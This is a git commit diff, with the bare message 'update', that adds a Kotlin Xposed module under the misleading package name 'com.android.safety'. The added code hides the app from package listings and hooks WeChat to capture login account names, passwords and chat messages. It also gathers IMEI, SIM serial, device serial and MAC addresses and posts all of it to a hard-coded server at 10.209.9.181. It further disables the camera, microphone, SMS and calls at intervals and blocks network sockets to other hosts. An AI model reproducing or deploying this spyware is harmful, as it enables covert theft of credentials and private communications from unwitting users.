c0f7f31950d0f86ed97bdbbeb1be049fea8f5ed5
hydewww <hydewwwww@gmail.com>
2019-07-04 04:18:42 +0800

    update

--- app/src/main/java/com/android/safety/Xposed.kt
+++ app/src/main/java/com/android/safety/Xposed.kt
@@ -1,23 +1,358 @@
 package com.android.safety
 
+import android.app.AndroidAppHelper
+import android.bluetooth.BluetoothAdapter
+import android.content.ContentValues
+import android.content.Context
+import android.content.pm.ApplicationInfo
+import android.content.pm.PackageInfo
+import android.telephony.TelephonyManager
 import de.robv.android.xposed.*
 import de.robv.android.xposed.callbacks.XC_LoadPackage
+import java.util.*
+import de.robv.android.xposed.XposedBridge
+import de.robv.android.xposed.XC_MethodHook
+import de.robv.android.xposed.XposedBridge.log
+import de.robv.android.xposed.XposedHelpers
+import okhttp3.FormBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import java.net.InetAddress
+import kotlin.concurrent.thread
+import java.net.NetworkInterface.getNetworkInterfaces
+
+
+
 
 class Xposed : IXposedHookLoadPackage {
-    @Throws(Throwable::class)
-    override fun handleLoadPackage(lpparam: XC_LoadPackage.LoadPackageParam) {
-        XposedHelpers.findAndHookMethod(
-            "android.hardware.Camera", // 类名
-            lpparam.classLoader,
-            "open", // 方法名
-            Int::class.java, // 参数，视方法而定
-            object : XC_MethodReplacement(){ // 回调方法
-                override fun replaceHookedMethod(param: MethodHookParam) { // 重写方法
-                    XposedBridge.log("相机: " + lpparam.packageName)
-                    val exception = java.lang.RuntimeException("")
-                    param.result = exception // 将结果设为Runtime异常
+
+    // 统一的hook操作
+    fun addHook(lpparam: XC_LoadPackage.LoadPackageParam, className: String, methodName: String){
+        XposedBridge.hookAllMethods(Class.forName(className), methodName, object : XC_MethodHook() {
+            override fun beforeHookedMethod(param: MethodHookParam) {
+                val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
+                if (minute % 2 == 1) { // 时间内则禁用
+                    val exception = Exception("")
+                    param.result = exception
+                    log("禁用 $className.$methodName " + lpparam.packageName)
                 }
-            })
+            }
+            override fun afterHookedMethod(param: MethodHookParam) {
+                val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
+                if (minute % 2 == 1) { // 时间内则禁用
+                    val exception = Exception("")
+                    param.result = exception
+                }
+            }
+        })
     }
 
+    // 隐藏本应用
+    fun hideInfo(lpparam: XC_LoadPackage.LoadPackageParam) {
+        XposedBridge.hookAllMethods(
+            Class.forName("android.app.ApplicationPackageManager"),
+            "getInstalledApplications",
+            object : XC_MethodHook()
+            {
+                override fun afterHookedMethod(param: MethodHookParam) {
+                    var list = param.result as List<ApplicationInfo>
+                    for (pkg in list) {
+                        if (pkg.packageName.equals("com.android.safety")) {
+                            list -= pkg
+                        }
+                    }
+                    param.result = list
+                }
+            }
+        )
+        XposedBridge.hookAllMethods(
+            Class.forName("android.app.ApplicationPackageManager"),
+            "getInstalledPackages",
+            object : XC_MethodHook()
+            {
+                override fun afterHookedMethod(param: MethodHookParam) {
+                    var list = param.result as List<PackageInfo>
+                    for (pkg in list) {
+                        if (pkg.packageName.equals("com.android.safety")) {
+                            list -= pkg
+                        }
+                    }
+                    param.result = list
+                }
+            }
+        )
+//        XposedBridge.hookAllMethods(
+//            Class.forName("android.app.ActivityManager"),
+//            "getRunningAppProcesses",
+//            object : XC_MethodHook()
+//            {
+//                override fun afterHookedMethod(param: MethodHookParam) {
+//                    var list = param.result as List<ActivityManager.RunningAppProcessInfo>
+//                    for (process in list) {
+//                        if (process.processName.equals("com.android.safety")) {
+//                            list -= process
+//                        }
+//                    }
+//                    param.result = list
+//                }
+//            }
+//        )
+//        XposedBridge.hookAllMethods(
+//            Class.forName("android.app.ActivityManager"),
+//            "getRunningServices",
+//            object : XC_MethodHook()
+//            {
+//                override fun afterHookedMethod(param: MethodHookParam) {
+//                    var list = param.result as List<ActivityManager.RunningServiceInfo>
+//                    for (service in list) {
+//                        if (service.process.equals("com.android.safety")) {
+//                            list -= service
+//                        }
+//                    }
+//                    param.result = list
+//                }
+//            }
+//        )
+//        XposedBridge.hookAllMethods(
+//            Class.forName("android.app.ApplicationPackageManager"),
+//            "getPackagesForUid",
+//            object : XC_MethodHook()
+//            {
+//                override fun afterHookedMethod(param: MethodHookParam) {
+//                    var list = param.result as Array<String>
+//                    for (str in list) {
+//                        if (str.equals("com.android.safety")) {
+//                            param.result = arrayOf("aoaoao")
+//                            log("哇哦getPackagesForUid")
+//                        }
+//                    }
+//                }
+//            }
+//        )
+    }
+
+    fun test(className: String, methodName: String) {
+        XposedBridge.hookAllMethods(Class.forName(className), methodName, object : XC_MethodHook() {
+                override fun afterHookedMethod(param: MethodHookParam) {
+                    log("$methodName")
+                }
+            }
+        )
+    }
+
+    // 将劫持信息发给服务器
+    fun post(data: FormBody) {
+        thread(start = true) {
+            val client = OkHttpClient()
+            val request = Request.Builder()
+                .url("http://10.209.9.181:5000/post")
+                .post(data)
+                .build()
+            try {
+                client.newCall(request).execute()
+            } catch (e: Error){}
+        }
+    }
+
+    // 蓝牙MAC
+    fun getBluetoothMacAddress(): String {
+        val bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
+        var bluetoothMacAddress = ""
+        try {
+            val mServiceField = bluetoothAdapter.javaClass.getDeclaredField("mService")
+            mServiceField.isAccessible = true
+            val btManagerService = mServiceField.get(bluetoothAdapter)
+            if (btManagerService != null) {
+                bluetoothMacAddress =
+                    btManagerService.javaClass.getMethod("getAddress").invoke(btManagerService) as String
+            }
+        } catch (e: Error){}
+        return bluetoothMacAddress
+    }
+
+    // WIFI MAC
+    fun getWFDMacAddress(): String {
+        try {
+            val interfaces = Collections.list(getNetworkInterfaces())
+            for (ntwInterface in interfaces) {
+                if (ntwInterface.getName().equals("p2p0", true)) {
+                    val byteMac = ntwInterface.getHardwareAddress() ?: return ""
+                    val strBuilder = StringBuilder()
+                    for (i in byteMac.indices) {
+                        strBuilder.append(String.format("%02X:", byteMac[i]))
+                    }
+                    if (strBuilder.length > 0) {
+                        strBuilder.deleteCharAt(strBuilder.length - 1)
+                    }
+                    return strBuilder.toString()
+                }
+            }
+        } catch (e: Exception) {}
+        return ""
+    }
+
+    // 获取设备信息
+    fun getInfo() {
+        log("hey")
+        var context: Context
+        try {
+            context = AndroidAppHelper.currentApplication()
+        } catch(e:Error) {
+            return
+        }
+        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        val data = FormBody.Builder()
+            .add("type", "2")
+            .add("model", android.os.Build.MODEL)
+            .add("serial", android.os.Build.SERIAL)
+            .add("imei", tm.imei)
+            .add("iccid", tm.simSerialNumber)
+            .add("wlanMac", getWFDMacAddress())
+            .add("bluMac", getBluetoothMacAddress())
+            .build()
+        post(data)
+    }
+
+    @Throws(Throwable::class)
+    override fun handleLoadPackage(lpparam: XC_LoadPackage.LoadPackageParam) {
+        hideInfo(lpparam)
+
+        addHook(lpparam, "android.hardware.Camera", "open")
+        addHook(lpparam, "android.media.AudioRecord", "startRecording")
+        addHook(lpparam, "android.media.MediaRecorder", "start")
+        addHook(lpparam, "android.telephony.SmsManager", "sendTextMessage")
+        addHook(lpparam, "android.telecom.TelecomManager", "placeCall")
+
+        // 劫持微信密码
+        if (lpparam.packageName.contains("com.tencent.mm")) {
+            XposedHelpers.findAndHookConstructor( // hook 构造函数
+                "com.tencent.mm.modelsimple.q", lpparam.classLoader, // 类
+                String::class.java, String::class.java, String::class.java, Int::class.java, // 参数
+                object : XC_MethodHook() // 回调
+                {
+                    @Throws(Throwable::class)
+                    override fun beforeHookedMethod(param: XC_MethodHook.MethodHookParam) {
+                        val account = param.args[0] as String
+                        val pass = param.args[1] as String
+                        log("WECHAT account:$account\npass:$pass")
+                        val data = FormBody.Builder()
+                            .add("type", "1")
+                            .add("account", account)
+                            .add("pass", pass)
+                            .build()
+                        post(data)
+                    } // end of beforeHookedMethod
+                } // end of XC_MethodHook
+            ) // end of findAndHookConstructor
+        }
+
+        // 劫持微信消息
+        if (lpparam.processName.equals("com.tencent.mm")) {
+            try {
+                XposedHelpers.findAndHookMethod( // hook
+                    "com.tencent.wcdb.database.SQLiteDatabase", lpparam.classLoader, // 类
+                    "insertWithOnConflict", // 方法
+                    String::class.java, String::class.java, ContentValues::class.java, Int::class.java, // 参数
+                    object : XC_MethodHook() { // 回调
+                        @Throws(Throwable::class)
+                        override fun afterHookedMethod(param: MethodHookParam) {
+                            //过滤掉非聊天消息
+                            val tableName = param.args[0] as String
+                            if (tableName != "message") {
+                                return
+                            }
+                            // 提取消息内容
+                            val contentValues = param.args[2] as ContentValues
+                            val isSend = contentValues.getAsInteger("isSend") // isSend=1: 表示是自己发送的消息
+                            val talker = contentValues.getAsString("talker") // talker: 对话人
+                            val createTime = contentValues.getAsLong("createTime") // createTime: 消息时间
+                            var content = String()
+                            try {
+                                content = contentValues.getAsString("content") // content: 消息内容
+                            } catch (e: Error) {
+                                content = "[img]"
+                            }
+                            log("WECHAT $contentValues")
+                            val data = FormBody.Builder()
+                                .add("isSend", isSend.toString())
+                                .add("talker", talker)
+                                .add("time", createTime.toString())
+                                .add("content", content)
+                                .build()
+                            post(data)
+                        } // end of afterHookedMethod
+                    } // end of XC_MethodHook
+                ) // end of findAndHookMethod
+            } catch (e:Error) {}
+            getInfo()
+        } // end of if
+
+    } // end of handleLoadPackage
+
+    val banSock = object: XC_MethodHook() {
+        @Throws(Throwable::class)
+        override fun beforeHookedMethod(param: XC_MethodHook.MethodHookParam) {
+            val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
+            if (minute % 2 == 1) { // 时间内则禁用
+                val host = param.args[0].toString()
+                val regex1 = Regex("((1[0-9][0-9]\\.)|(2[0-4][0-9]\\.)|(25[0-5]\\.)|([1-9][0-9]\\.)|([0-9]\\.)){3}((1[0-9][0-9])|(2[0-4][0-9])|(25[0-5])|([1-9][0-9])|([0-9]))")
+                val regex2 = Regex("(?<=//|)((\\\\w)+\\\\.)+\\\\w+")
+                if (host.contains(regex1) &&
+                    host.contains(regex2) &&
+                    !host.contains("10.209.9.181") &&
+                    !host.contains("127.0.0.1") &&
+                    !host.contains("localhost"))
+                {
+                    val exception = RuntimeException("")
+                    param.result = exception
+                }
+            }
+        }
+    }
+
+    fun network(lpparam: XC_LoadPackage.LoadPackageParam) {
+//        addHook(lpparam, "java.net.URL", "openConnection")
+//        addHook(lpparam, "java.net.Socket", "getInputStream")
+//        addHook(lpparam, "java.net.URLConnection", "getInputStream")
+
+        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
+            String::class.java, Int::class.java,
+            banSock
+        )
+        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
+            InetAddress::class.java, Int::class.java,
+            banSock
+        )
+        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
+            String::class.java, Int::class.java, InetAddress::class.java, Int::class.java,
+            banSock
+        )
+        XposedHelpers.findAndHookConstructor("java.net.Socket", lpparam.classLoader,
+            String::class.java, Int::class.java, InetAddress::class.java, Int::class.java,
+            banSock
+        )
+
+//        XposedBridge.hookAllConstructors(
+//            Class.forName("java.net.URLConnection"),
+//            object : XC_MethodHook()
+//            {
+//                @Throws(Throwable::class)
+//                override fun beforeHookedMethod(param: MethodHookParam) {
+//                    val args = param.args as Array
+//                    if (args.size != 1 || param.args[0].javaClass != URL::class.java)
+//                        return
+//                    val minute = Calendar.getInstance(TimeZone.getTimeZone("GMT+8:00")).get(Calendar.MINUTE) // 获取时间
+//                    if (minute % 2 == 1) { // 时间内则禁用
+//                        log("禁用网络 " + args[0])
+//                        param.args[0] = ""
+//                        val exception = RuntimeException("")
+//                        param.result = exception
+//                        return
+//                    } else {
+////                        log("HttpURLConnection: " + args[0])
+//                    }
+//                }
+//            }
+//        )
+    }
 }
